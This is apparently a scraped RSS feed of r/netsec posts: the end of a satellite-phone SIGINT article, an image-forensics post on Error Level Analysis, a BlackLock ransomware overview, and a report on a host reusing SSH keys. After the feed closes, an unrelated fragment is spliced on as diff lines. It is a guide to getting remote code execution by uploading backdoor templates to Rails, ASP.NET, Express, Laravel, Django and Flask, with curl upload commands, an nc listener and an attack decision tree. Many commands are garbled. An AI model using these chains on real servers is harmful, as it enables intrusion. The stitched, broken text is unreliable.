deployment options (likely via remote exploitation) were being investigated.‍Implantation of Tiantong smartphones will have different considerations from purpose-built Thuraya handsets. On the one hand, such smartphones consist of much more COTS hardware and software (Android on ARM with one of a handful of well-understood basebands) for which a sophisticated adversary likely already has capabilities and/or expertise.But things are a little different for more modern Huawei smartphones since they increasingly rely on Huawei-proprietary software and hardware. Take the Huawei Mate 60 Pro. Starting with HarmonyOS NEXT, Android has been abandoned as the foundation of HarmonyOS in favor of an  running its own native app format. The Kirin 9000S SoC has an integrated Balong 5000 baseband, both by Chinese manufacturer HiSilicon. A publicly available teardown lists a component marked HI1105 which matches HiSilicon’s HI11xx IC used as a WiFi chip by other Huawei Mate smartphones. This means an adversary will have to invest a lot of resources to build new exploits and software/hardware implants for these Huawei phones and their OS, baseband, and Wi-Fi chip – all of which are now proprietary to Huawei. Venezuelan president Nicolás Maduro even seems to believe the Huawei Mate X6 gifted to him simply cannot be hacked by US intelligence agencies.The downside of this approach is that Huawei can no longer benefit so easily from security updates and advances coming in through Western ecosystems and they will increasingly form a self-selecting priority target for Western intelligence agencies (similar to how crimephones self-select for targeting by law enforcement). The opacity of proprietary technology really isn’t much of a barrier either, given Western intelligence’s long-standing targeting of Huawei. In fact, some public security research has already been performed on the HarmonyOS NEXT ecosystem and Balong baseband [1, 2, 3].While the Tiantong ecosystem doesn’t look like brand new magical fairy dust technology, it might make sense for certain parties worried about Western or under-resourced intelligence agencies surveilling regular cellular networks. It essentially forces such agencies to deploy expensive SIGINT capabilities around the right spot beams and while the U.S. can operate unimpeded at SCS sites in virtually all countries surrounding Iran, this isn’t the case for every SIGINT agency everywhere and likely still requires some more perilous rollout of covert infrastructure inside Iran itself. On top of that if no GPS information can be extracted from Tiantong traffic, geolocation becomes far less granular. Depending on caveats mentioned above, cracking its cryptography might prove a tough challenge as well and remote exploitation and supply chain attacks are also likely to be more laborious (for now). Still, good opsec would need to be observed by disabling cellular capabilities and avoiding co-traveling devices. As such, while hardly revolutionary or foolproof - one can see how adopting Tiantong might make sense for certain actors.For those interested in advancing their RF security skills, Midnight Blue will be delivering its Red Team SIGINT training at .This practically-oriented course, aimed at red team operators and pentesters, will teach attendees the fundamentals of RF, SDR, and SIGINT before quickly moving on to effective guidance on identifying and decoding unknown signals as well as exploiting common pitfalls in RF security.‍Where other SDR trainings tend to focus on enterprise and IoT RF protocols such as 4G/5G, WiFi, RFID, and BT, this training focuses on important but rarely addressed RF technologies such as automotive, aviation, marine, and physical access control RF protocols and mission-critical radio (e.g. TETRA, DMR, P25) used by police, military, private security, and critical infrastructure.Hands-on exercises such as intercepting and decrypting handheld radio comms and breaking automotive security systems are alternated with thorough overviews of relevant RF protocols and their security posture as well as case studies of real-world RF attacks on railways, water utilities, drones, and police/military radios.An overview of the course can be found ‍]]></content:encoded></item><item><title>Tea continued - Unauthenticated access to 150+ Firebase databases, storage buckets and secrets</title><link>https://ice0.blog/docs/openfirebase</link><author>/u/Woowowow91</author><category>netsec</category><pubDate>Tue, 23 Sep 2025 18:44:24 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Image Forensics: Detecting AI Fakes with Compression Artifacts</title><link>https://dmanco.dev/2025/09/15/basics-of-image-forensics-1.html</link><author>/u/Doch88</author><category>netsec</category><pubDate>Tue, 23 Sep 2025 16:47:03 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[Let’s start with some context. Why am I writing this post?I work at Fourthline, a company that manages the Know Your Customer (KYC) process for companies like Revolut, TradeRepublic, and N26. 
-For those who don’t know what KYC is, think of when you register online to use one of these services and are asked to take a selfie and a picture of your ID document to prove you are who you claim to be. 
-That’s KYC in a nutshell, and as you may guess, we don’t want fraudsters to slip through. If you’ve ever played Papers, Please, you can imagine this isn’t always easy. Fraudsters are getting better, and technology is helping them. 
-Deepfakes and AI-generated selfies and documents have become some of their tools, and my job at Fourthline is also to fight this kind of AI. 
-Yes, I’m an AI engineer who fights AI. A sort of cyberwar destined to become even more challenging as technology advances. But to fight deepfakes, I should also study how similar problems were handled in the past. 
-Image manipulation has existed for decades, long before generative models reached today’s quality. 
-So let’s go back to 2007 and talk about compression and Error Level Analysis (ELA).Almost every image on the internet is compressed; handling uncompressed images everywhere would be too expensive. 
-Let’s look at an example. I took an image with my camera with a resolution of 6000x4000. 
-Quick math: that’s 24,000,000 pixels. Every pixel stores information about color, and color in computer science is usually expressed with 8 bits. 
-To cover most colors, we need three channels — red, green, and blue — so every pixel carries 8 × 3 bits of information. The weight of this image should be 6000 × 4000 × 8 × 3 = 576,000,000 bits, or 72 megabytes. 
-Instead, it weighs only 6 megabytes. JPEG is the most widely used image compression algorithm. In simple terms, the algorithm works by removing parts of the image that are barely noticeable to the human eye. It has a parameter called  that sets how aggressive the compression is.
-A quality of 100% means very little is removed, while 1% means heavy information loss. Because information is lost, the image content is altered in subtle ways. If you look at the single pixel values, you’ll notice differences. Depending on the chosen quality, these differences may be invisible to the eye but still exist. 
-These differences are a trace left by the JPEG compression, a sort of fingerprint. We call them . Now the interesting part comes.  
-Since JPEG compression is applied to the entire image, these artifacts should always be  inside the image. 
-If the image is tampered with in some way - say an object is removed in Photoshop - this will affect the JPEG artifacts as well.
-You would notice an inconsistency of these artifacts in the particular area of the image that was altered. 
-And this is exactly what ELA is based on.Take the image to analyzeCompress it again with JPEG at a chosen quality - this will become a parameter of ELACalculate the difference between the two imagesThe result is an ELA map to interpret.  
-The assumption here is that the image (or parts of it) was compressed with JPEG at some point. Let’s use a toy example to explain how it works. Using something from my domain of work, let’s consider this specimen of a French national ID card. Suppose I know it was compressed at JPEG quality 95%. I’ll use that later. 
-Now, I inpaint the image with an AI model and get this:And, importantly, I save this deepfake in PNG format. 
-Unlike JPEG, PNG uses  compression, meaning no information is lost. Now, using the information above, we perform ELA with a .
-In this way, the part of the image that was already compressed with the same quality factor should not produce any new artifact.The tampered area is obvious. We successfully detected the deepfake ID and blocked a fraudster. But in reality, you may not know the original JPEG quality, and it’s unlikely that the manipulated image (previously a JPEG) would be saved as PNG.Now let’s assume the deepfake was saved as JPEG. 
-We don’t know the quality factor. We only know that if the image was altered, part of it will be double-compressed and part single-compressed, producing inconsistency.We perform ELA with JPEG quality 80% for both images.Now ELA feels more like art. 
-There’s a clear difference, but without knowing tampering occurred, could you detect it from the map alone? 
-To better understand how to interpret an ELA map, we can take some notes from how JPEG works: JPEG creates more artifacts in high-contrast areas (like text or borders), making ELA brighter there.Flat surfaces should have uniform ELA values.Similar textures should produce similar ELA.If some part of the image doesn’t respect these ‘rules’, then it might be suspicious. Like the deepfaked face on the ID, with a suspiciously bright ELA. 
-For more tips, see FotoForensics and their tutorials.So, can ELA be a solution to detect AI-manipulated images? 
-No, not by itself anyway. ELA is just a tool in the Image Forensics toolbox that can help fight deepfakes. 
-But many other things can be used together with ELA, such as EXIF information, PRNU, PCA and so on. 
-And probably some of these techniques will be the topic for another post.]]></content:encoded></item><item><title>BlackLock Ransomware: From Meteoric Rise to Sudden Disruption</title><link>https://wealthari.com/blacklock-ransomware-from-meteoric-rise-to-sudden-disruption/</link><author>/u/Koyaanisquatsi_</author><category>netsec</category><pubDate>Tue, 23 Sep 2025 07:35:57 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[ has quickly climbed the ranks in the global ransomware scene, setting new benchmarks for attack frequency and technical complexity. Emerging in March 2024 under the name El Dorado, the group rapidly rebranded and, by late 2024, was responsible for a 1,425% surge in data leak site posts, making it the fifth most active ransomware group worldwide by January 2025.Advanced Attack Techniques & Double ExtortionBlackLock distinguishes itself by deploying custom-built malware—eschewing leaked builder kits common among competitors—and leveraging a cross-platform approach that targets Windows, Linux, and VMware ESXi environments. The ransomware utilizes the powerful ChaCha20 stream cipher and advanced ECDH key exchange mechanisms to encrypt files and metadata, rendering standard recovery methods useless.BlackLock’s double extortion tactic combines file encryption with the exfiltration of sensitive data: victims are threatened with both permanent data loss and public exposure unless they pay the ransom. Encrypted files are renamed with randomized strings and extensions, and ransom notes are left titled “HOW_RETURN_YOUR_DATA.TXT” in compromised folders.Operations Disrupted by Major Security BreachIn March 2025, BlackLock faced an unprecedented disruption. Cybersecurity researchers from Resecurity exploited a vulnerability in the group’s data leak site, exposing its infrastructure, clearnet IPs, and MEGA storage accounts for stolen data. The situation escalated when the rival DragonForce group defaced BlackLock’s site and leaked configuration details—forcing BlackLock and its affiliates offline for the foreseeable future.Ongoing Threats and Industry ImpactDespite the recent dismantling, BlackLock’s legacy remains concerning. Its aggressive recruitment strategies, particularly on the Russian-language forum RAMP, and its unique technical sophistication have made it a blueprint for future ransomware operations. With attacks striking public services, technology firms, manufacturing, and government agencies across several countries, analysts warn that the threat model established by BlackLock will influence ransomware trends throughout 2025.Security experts recommend organizations invest in robust backup solutions, network segmentation, comprehensive endpoint protection, and regular patch management to mitigate risks from similar cross-platform ransomware threats. Proactive monitoring and intelligence sharing remain critical in defending against evolving attack methodologies pioneered by groups like BlackLock.]]></content:encoded></item><item><title>Journeys in Hosting 1/x - Precomputed SSH Host Keys</title><link>https://dataplane.org/jtk/blog/2025/09/hosting-stories-1/</link><author>/u/jtkchicago</author><category>netsec</category><pubDate>Mon, 22 Sep 2025 22:05:04 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[In what I hope will be the debut of many in a series to come, I want to
-share my experience and musings as a frequent traveler in the world of
-hosting providers.  Sometimes it will be just curious anomalies, of
-little interest to but a few.  But perhaps some tales told here will
-ultimately prove valuable to others looking for insight even if to
-obscure scenarios.  Maybe especially to obscure scenarios.This inaugural article will focus on the unusual and curious operational
-behavior of precomputed SSH host keys in default system installs by
-LightNode.LightNode is the server hosting brand of Kaopu Cloud, a global network
-services provider based in China.  They have been providing KVM-based
-hosting for approximately four years as of this writing. A compelling
-feature of LightNode’s offerings is the rather unique set of data center
-markets they operate in.  Otherwise, most of the capabilities the
-LightNode platform has are similar to many global hosting providers.
-The one notable exception is they do not currently offer native IPv6
-addressing and connectivity.“[ASN-DROP entries are] associated with the worst of the worst
-behavior. These are ASNs that our researchers wouldn’t recommend
-engaging with and are highly likely to announce or supply transit to
-IP ranges associated with malicious behavior. From networks hosting
-botnet command and control systems, to “bulletproof” networks selling
-connectivity/hosting to cyber criminals, to hardcore spammers, and
-more.”Despite appearing in ASN-DROP, LightNode is relatively popular and
-seemingly widely used by many.  At the time of this writing the
-originating AS announces the equivalent of about three /16 IPv4 prefixes
-or roughly 180 thousand addresses.  Far fewer than the biggest cloud
-providers, and about an order of magnitude less than Linode (AS 63949)
-has for example, but still more than what most .edu’s hold.To setup a new system through LightNode’s user interface you choose a
-location, system type, system version if applicable, and minimum
-resource requirements to name a few configurable options.A system type may be a vanilla operating system image such as Ubuntu,
-Debian, AlmaLinux, Arch Linux, CentOS, FreeBSD, Rocky Linux, or Windows.
-For most OS types there are usually a few different versions to choose
-from.  There are over a dozen application-specific system types if you
-want a preconfigured Docker or WordPress system for example.  This
-process is straightforward and would seem familiar to anyone who has had
-experience using other hosting providers.  There is nothing particularly
-special about this process.  However, there is one very specific,
-default configuration detail on most if not all the LightNode installed
-systems I’ve not seen replicated by any other hosting provider.Each of LightNode’s Unix-based system options will install an OpenSSH
-server listening on TCP port 22 by default.  You have the option of
-specifying access to the SSH service with a public key or password.
-Normally, the SSH server host keys are generated as part of the package
-installation process using the  utility.  This would result
-in one-time unique pairs of keys for each and every system.  This is
-where LightNode seems to do something very different than every other
-hosting provider I’m aware of.I tested a number of configurations and performed a survey of LightNode SSH
-servers listening on TCP port 22 to support this claim.  The table below shows
-the number of TCP port 22 SSH listeners, distinct host keys, and distinct key
-types I found:We would not expect to see so few keys compared to the number of TCP port 22
-listeners.  Most modern Unix-based systems would have two or three different
-and unique keys per system, so in theory we’d expect see roughly 60,000 to
-90,000 keys.  Instead, on average we see at least 25 addresses for every key.
-In fact it is a worse than that, because 1228 represents all key types and most
-hosts use three key types on average.  If we consider only  keys,
-the most common type, this is what emerges:The number of listeners that have an ssh-rsa host key is 98.5% of the
-original count, but the number of unique keys is now 39% of the
-original.  This is is significant amount of SSH host key duplication
-across LightNode’s infrastructure.This leads us to ask at least one more question.  If there are 478
-distinct ssh-rsa host keys, how many times are each of those keys used?
-Surely LightNode doesn’t have 478 different system types does it?  No,
-it is something less than that.  We might not know exactly what the
-unique count is given that some templates may been retired, but we can
-examine keys by popularity.  A table of statistics starts to get a
-little messy so I’ll simply tell you that the most popular ssh-rsa key
-is associated with LightNode’s Ubuntu 22.04 template.  It is seen on
-over 10,000 Listener addresses!  About one in three LightNode systems
-with a public SSH listener on TCP port run Ubuntu 22.04 and all use the
-same SSH host key.So LightNode appears to have precomputed SSH host keys for each of the
-unique system templates it offers as an install option.  For example,
-all LightNode Debian 12 installations, by default, will use the same SSH
-host key pairs that you’ll find stored in 
-files.  Debian 11 will use another set of keys, but common to all Debian
-11 installations.  And so on.  It is unclear if this is a failure of
-entropy or if ssh-keygen is just never run, but the outcome is the same.
-The host keys are predictable and shared with other hosts built from the
-same system template configuration.I can think of two scenarios where this anomaly might purposely occur in
-practice.  One, some hosts have multiple addresses assigned, and each
-address has the same SSH server daemon active and willing to accept
-connections across all interfaces.  In this case you’d see what looks
-like a multi-homed system.  Honeypots may exhibit this behavior for
-example.  Two, each listener address may be a different system, but host
-keys are being generated from the exact same entropy source for
-ssh-keygen, or are set to use precomputed ssh host keys.  You might find
-this in certain enterprise or private environments as a way to simplify
-key management.  It is this second scenario that LightNode appears to
-fall into.It is unclear why LightNode sets up the SSH listener this way for
-public, independent systems.  Perhaps the platform designer thought this
-would speed-up system setup and VM creation time?  Should we care about
-this?  Is it really bad?  Could this be something more insidious?  What,
-if anything, do we do?Exposure of private encryption keys is a bad thing, and potentially
-catastrophic.  However, when it comes to SSH server host keys, the
-damage is not as great as it might be compared to other public key
-systems.  SSH server host keys are used to “identify” the system.  An
-impersonation attack is feasible here.  That is, if someone hijacked the
-SSH server IP address and used the same SSH host keys, an unwitting
-client would not receive an authentication warning, because from the
-perspective of the SSH protocol, it looks like the same system.  A
-hijack, or MitM attack, of this sort might then be able to capture and
-decrypt communications from there on out.  However, even if past traffic
-was captured and the SSH server host keys are known, a separate session
-key is used for traffic encryption that cannot be easily derived without
-direct access to an end system at the time of operation.  In the
-immortal words of the The Hitchhiker’s Guide to the Galaxy: Don’t Panic.Nevertheless, this scenario is less than ideal.  I tried to contact
-LightNode support about this.  I also tried to reach out to
-CNCERT/CC, the national computer network
-emergency response technical team / coordination center of China.  A
-colleague also tried to communicate with a CNCERT contact on my
-behalf.  These attempts have been met with silence.  I’d guess this may
-help explain why the ASN is listed on the Spamhaus ASN-DROP.  Perhaps,
-as another colleague once put it, the difference in our native languages
-can act as a natural firewall between us.Technically LightNode or someone with the ability to hijack LightNode
-addresses could impersonate SSH servers there. I’m inclined to accept
-this is a relatively low probability threat, and likely an unintentional
-vulnerability on LightNode’s part.  If you’re a LightNode customer, it
-would be wise to setup new host keys.  If you or anyone you know has any
-ability to convince LightNode to alter this practice, I’d be happy to
-hear about it.]]></content:encoded></item></channel></rss>
+curl  https://target.com/nonexistent
+curl  https://target.com/page/../../config/app
+
+
+curl  https://target.com/
+
+
+curl  https://target.com/nonexistent
+
+curl 
+curl  https://target.com/
+
+
+curl  https://target.com/nonexistent
+
+curl 
+curl 
+curl  https://target.com/
+
+
+curl 
+curl Step 7: Automated Detection Scripts |  | 
+curl  |  |  | 
+curl  |  |  | 
+curl  2>&1 |  |  | 
+curl  |  |  | 
+curl  |  |  | 
+curl  |  |  | 
+curl  |  |  +x framework-vuln-scanner.sh
+./framework-vuln-scanner.sh https://target.com
+Step 8: Framework-Specific Exploitation Chains
+curl  POST https://target.com/upload  backdoor.cshtml 
+curl Ruby on Rails - Full Chain evil.html.erb curl  POST https://target.com/upload 
+curl  backdoor_controller.rb curl  POST https://target.com/upload 
+curl Node.js/Express - Full Chain (No File Write!)
+curl  https://target.com/profile
+
+
+
+curl  backdoor.ejs curl  POST https://target.com/upload 
+
+curl  backdoor.blade.php curl  POST https://target.com/upload 
+curl Python/Django - Full Chain __init__.py curl  POST https://target.com/upload 
+curl Python/Flask - Full Chain __init__.py curl  POST https://target.com/upload 
+nc  4444
+
+
+curl Step 9: Code Review ChecklistUniversal Red Flags (All Frameworks)Framework-Specific Red FlagsStep 10: Quick Exploitation Decision Tree[File Write Capability]
+    |
+    ├─ ASP.NET MVC?
+    │   └─ Write to ~/Views/{Controller}/{Action}.cshtml → Trigger route → RCE
+    |
+    ├─ Ruby on Rails?
+    │   ├─ Wildcard route exists?
+    │   │   └─ Write .erb anywhere → Path traversal via URL → RCE
+    │   └─ No wildcard?
+    │       └─ Write to exact path: app/views/{controller}/{action}.erb → RCE
+    |
+    ├─ Node.js/Express?
+    │   ├─ Options injection possible?
+    │   │   └─ No file write needed! → Inject outputFunctionName → RCE
+    │   └─ File write only?
+    │       └─ Write to views/{template}.ejs → Trigger render → RCE
+    |
+    ├─ PHP/Laravel?
+    │   └─ Write to resources/views/{name}.blade.php → Trigger view() → RCE
+    |
+    ├─ Python/Django?
+    │   ├─ SSTI exists?
+    │   │   └─ No file write needed! → SSTI payload → Limited RCE
+    │   └─ File write only?
+    │       └─ Write to {app}/__init__.py → Restart/import → RCE
+    |
+    ├─ Python/Flask?
+    │   ├─ SSTI exists?
+    │   │   └─ No file write needed! → SSTI payload → Limited RCE
+    │   ├─ Debug mode?
+    │   │   └─ Write to __init__.py → Auto-reload → RCE
+    │   └─ Production?
+    │       └─ Write to __init__.py → Wait for restart → RCE
+    |
+    └─ Go/Gin/Echo?
+        ├─ SSTI exists?
+        │   └─ File read via gadgets (not RCE)
+        └─ No SSTI?
+            └─ Very limited attack surface
+Mistake 1: Wrong File Extension❌ Rails: Uploading evil.html (won't execute)
+✅ Rails: Upload evil.html.erb (will execute)
+
+❌ Laravel: Uploading backdoor.php (might work but no Blade directives)
+✅ Laravel: Upload backdoor.blade.php (full Blade functionality)
+
+❌ Express: Uploading shell.js (won't be rendered)
+✅ Express: Upload shell.ejs or shell.hbs (depends on engine)
+Mistake 2: Wrong Target Path❌ Rails: Writing to public/ (static files, no execution)
+✅ Rails: Write to app/views/ (executed by ERB engine)
+
+❌ Django: Writing to static/ (no execution)
+✅ Django: Write to {app}/__init__.py (executes on import)
+
+❌ ASP.NET: Writing to ~/Content/ (static files)
+✅ ASP.NET: Write to ~/Views/ (executed by Razor)
+Mistake 3: Not Understanding Auto-reloadFiles execute immediately on save (hot reload)Perfect for  overwritesMay need to wait for deployment or crash the appZeitwerk auto-reloads code changes → No auto-loadingMistake 4: Forgetting Framework ConstraintsSandboxed - can’t call arbitrary functionsRCE is extremely difficultFocus on file reads via SSTI gadgetsNeed specific gadgets for RCE overwrite is more reliableOptions injection is easier than file writeNo file write needed (options injection)Simple include, minimal protectionsWildcard routes + ERB executionView Engine patterns predictableSSTI or  (needs debug/restart)Requires  + restart/importTemplate sandboxing, no easy RCEThe common theme across all frameworks:Framework-level file resolution mechanisms bypass web server protections.When developers rely on convention-over-configuration patterns:Predictable file paths emergeAutomatic file loading creates attack surfacesPath traversal + file write = RCE Even without wildcard routing, if you can write to exact template/controller paths, you can achieve RCE in most frameworks. Validate all file paths, never use dynamic template names, disable debug modes in production, and use explicit whitelisting.CVE-2014-0130: Rails Wildcard Routing Path TraversalCVE-2022-29078: EJS Template InjectionCVE-2022-25967: Eta Template Engine RCEASP.NET MVC View Engine Research (by Diyan Apostolov) @ CTBBOWASP Testing Guide v4: Template InjectionPortSwigger: Server-Side Template Injection]]></content:encoded></item></channel></rss>
